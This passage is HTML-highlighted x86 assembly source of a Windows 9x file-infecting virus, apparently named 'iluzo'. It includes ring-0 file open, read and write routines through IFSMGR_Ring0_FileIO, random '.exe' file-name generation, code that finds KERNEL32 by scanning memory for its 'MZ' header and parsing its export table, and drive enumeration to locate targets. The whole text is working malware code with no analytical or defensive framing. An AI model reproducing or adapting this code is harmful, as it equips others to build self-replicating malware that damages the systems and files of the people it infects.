        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">name_search</span><span class="sc0">
    </span><span class="sc5">name_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_spec_char</span><span class="sc0">
    </span><span class="sc5">no_gen_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_spec_char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">gen_spec_char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">char_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">char_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'!'</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">char_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_8</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ functionz for file access ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;input:     edx=filename</span><span class="sc0">
        </span><span class="sc1">;output:    cf, eax=file handle</span><span class="sc0">
</span><span class="sc5">fopen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2022h</span><span class="sc0">   </span><span class="sc1">;no int 24h, r/w</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">      </span><span class="sc1">;file attrib</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;fail | open</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     ebx=file handle</span><span class="sc0">
</span><span class="sc5">fclose</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     ebx=file handle</span><span class="sc0">
        </span><span class="sc1">;       edx=buffer</span><span class="sc0">
        </span><span class="sc1">;       ecx=size</span><span class="sc0">
        </span><span class="sc1">;       esi=file pos</span><span class="sc0">
        </span><span class="sc1">;output:    cf, ecx=bytes read</span><span class="sc0">
</span><span class="sc5">fread</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;set cf flag (if eax&lt;&gt;ecx cf=1 else cf=0)</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     ebx=file handle</span><span class="sc0">
        </span><span class="sc1">;       edx=buffer</span><span class="sc0">
        </span><span class="sc1">;       ecx=size</span><span class="sc0">
        </span><span class="sc1">;       esi=file pos</span><span class="sc0">
        </span><span class="sc1">;output:    cf, ecx=bytes written</span><span class="sc0">
</span><span class="sc5">fwrite</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     ecx=fileattr</span><span class="sc0">
        </span><span class="sc1">;       edx=filename</span><span class="sc0">
</span><span class="sc5">fsetattr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc4">+</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     ebx=file handle</span><span class="sc0">
        </span><span class="sc1">;output:    cf, eax=file size</span><span class="sc0">
</span><span class="sc5">fgetsize</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     ecx=attribs</span><span class="sc0">
        </span><span class="sc1">;       edx=filemask</span><span class="sc0">
        </span><span class="sc1">;       esi=dta</span><span class="sc0">
        </span><span class="sc1">;output:    cf, eax=handle</span><span class="sc0">
</span><span class="sc5">ffindfirst</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0">    </span><span class="sc1">;kind of function</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;edx=dta struct</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;result to pusha(eax)</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     eax=handle</span><span class="sc0">
        </span><span class="sc1">;       esi=dta</span><span class="sc0">
        </span><span class="sc1">;output:    cf</span><span class="sc0">
</span><span class="sc5">ffindnext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FINDNEXTFILE</span><span class="sc0">    </span><span class="sc1">;kind of function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;edx=dta stuct</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;input:     eax=handle</span><span class="sc0">
</span><span class="sc5">ffindclose</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle to ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0">    </span><span class="sc1">;kind of function</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">malloc</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">201h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">HeapAllocate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mdealloc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">HeapFree</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_9</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to get kernel's address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">find_kernel32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;I need kernel's address</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">      </span><span class="sc1">;'cause of GetDriveType</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">       </span><span class="sc1">;function</span><span class="sc0">
    </span><span class="sc5">__scanning</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__scanning</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel_base</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; kernel's base 'MZ' address in EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; GetProcAddress</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpa</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sET_sz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sET_str</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__searchET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; GetDriveType address</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel_base</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;GetProcAddress</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pGetDriveType</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">; search function's address</span><span class="sc0">
    </span><span class="sc5">__searchET</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;search export table of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;KERNEL32, searching the</span><span class="sc0">
    </span><span class="sc5">__sET_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;the names, then the ordinal</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;and, finally the RVA pointerz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc5">__sET_str</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc5">__sET_sz</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sET_found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__sET_next</span><span class="sc0">
    </span><span class="sc5">__sET_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ search fixed, cd-rom, ram-disk, etc. ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function gets informations about disks. I call</span><span class="sc0">
        </span><span class="sc1">;GetDriveType function to get type of disk. You can use</span><span class="sc0">
        </span><span class="sc1">;Win32API Help to know more or WinBase.H (by CBuilder, MSVC)</span><span class="sc0">
        </span><span class="sc1">;where you can see more flagz and their values. So, I can</span><span class="sc0">
        </span><span class="sc1">;use GetLogicalDrives function, but that's one. Maybe you</span><span class="sc0">
        </span><span class="sc1">;can say: "Why he will not check it in ring-0 ?". Because</span><span class="sc0">
        </span><span class="sc1">;I don't know how. I tried to debug some VxD functions as</span><span class="sc0">
        </span><span class="sc1">;is IFSFN_Ring0GetDriveInfo, but I haven't any flagz if</span><span class="sc0">
        </span><span class="sc1">;DISK_FIXED is really 0x41 value or not (debug to know more).</span><span class="sc0">
        </span><span class="sc1">;And if you want, try to debug IFSFN_Get_Drive_Info and</span><span class="sc0">
        </span><span class="sc1">;there's only RET instruction :)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_disks</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc12">'A'</span><span class="sc0">

        </span><span class="sc1">; GetDriveType function...</span><span class="sc0">
    </span><span class="sc5">__gd_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pGetDriveType</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

